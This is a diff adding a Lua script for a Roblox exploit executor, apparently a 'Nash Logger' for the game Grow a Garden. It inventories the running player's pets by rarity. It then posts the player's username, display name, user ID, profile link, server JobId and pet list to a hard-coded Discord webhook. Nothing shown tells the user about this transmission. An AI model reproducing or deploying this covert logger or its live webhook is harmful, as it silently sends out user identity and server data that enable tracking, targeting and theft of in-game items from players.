@@ -1,0 +1,123 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Discord Webhook
+local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
+
+-- Game name
+local gameName = "Unknown"
+
+-- 嘗試從 GitHub 載入寵物品質分類 JSON
+local PetQuality = {}
+local NameToQuality = {}
+
+local qualityURL = "https://raw.githubusercontent.com/Nash29197/Nash-Hub/refs/heads/main/Grow%20a%20Garden%20%7C%20PETS.json"
+
+pcall(function()
+    local requestFunc = request or http_request or syn and syn.request or http and http.request
+    if requestFunc then
+        local response = requestFunc({
+            Url = qualityURL,
+            Method = "GET"
+        })
+
+        if response and response.Body then
+            PetQuality = HttpService:JSONDecode(response.Body)
+        else
+            warn("無法載入寵物分類 JSON：空回應")
+        end
+    else
+        warn("Executor 不支援 HTTP 請求")
+    end
+end)
+
+-- 反查：建立寵物名 -> 品質 的對照表
+for quality, petList in pairs(PetQuality) do
+    for _, petName in ipairs(petList) do
+        NameToQuality[petName] = quality
+    end
+end
+
+-- 嘗試取得遊戲名稱
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    gameName = info.Name or "Unknown"
+end)
+
+-- 玩家個人頁面連結
+local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId) .. "/profile"
+
+-- 初始化分類結果儲存
+local petsByQuality = {}
+for quality in pairs(PetQuality) do
+    petsByQuality[quality] = {}
+end
+
+-- 遍歷背包內的 Tool 並依名稱對應分類
+for _, item in ipairs(LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+    if item:IsA("Tool") then
+        local itemName = item.Name
+        for petName, quality in pairs(NameToQuality) do
+            if itemName:lower():find(petName:lower(), 1, true) then
+                table.insert(petsByQuality[quality], itemName)
+                break
+            end
+        end
+    end
+end
+
+-- 建立 Discord fields
+local fields = {}
+for _, quality in ipairs({"Common", "Uncommon", "Rare", "Legendary", "Mythical", "Divine", "Prismatic"}) do
+    local pets = petsByQuality[quality]
+    if pets and #pets > 0 then
+        table.insert(fields, {
+            name = quality .. " Pets:",
+            value = table.concat(pets, "\n"):sub(1, 1024),
+            inline = false
+        })
+    end
+end
+
+-- 建立 Embed
+local embed = {
+    ["title"] = "腳本執行",
+    ["description"] = "**真實名稱:** " .. LocalPlayer.Name ..
+                      "\n**顯示名稱:** " .. LocalPlayer.DisplayName ..
+                      "\n**玩家ID:** " .. LocalPlayer.UserId ..
+                      "\n**個人資料:** [Roblox 個人頁面](" .. profileUrl .. ")" ..
+                      "\n**遊戲:** " .. gameName ..
+                      "\n**玩家伺服器人數:** " .. #Players:GetPlayers() ..
+                      "\n**加入代碼:** " .. game.JobId,
+    ["fields"] = fields,
+    ["color"] = tonumber("0x3498db"),
+    ["footer"] = {
+        ["text"] = "Nash Logger"
+    },
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local data = {
+    ["username"] = "Script Logger",
+    ["embeds"] = {embed}
+}
+
+-- 傳送至 Discord Webhook
+pcall(function()
+    local jsonData = HttpService:JSONEncode(data)
+    local requestFunc = request or http_request or syn and syn.request or http and http.request
+    if requestFunc then
+        requestFunc({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    else
+        warn("Executor 不支援 HTTP 請求")
+    end
+end)
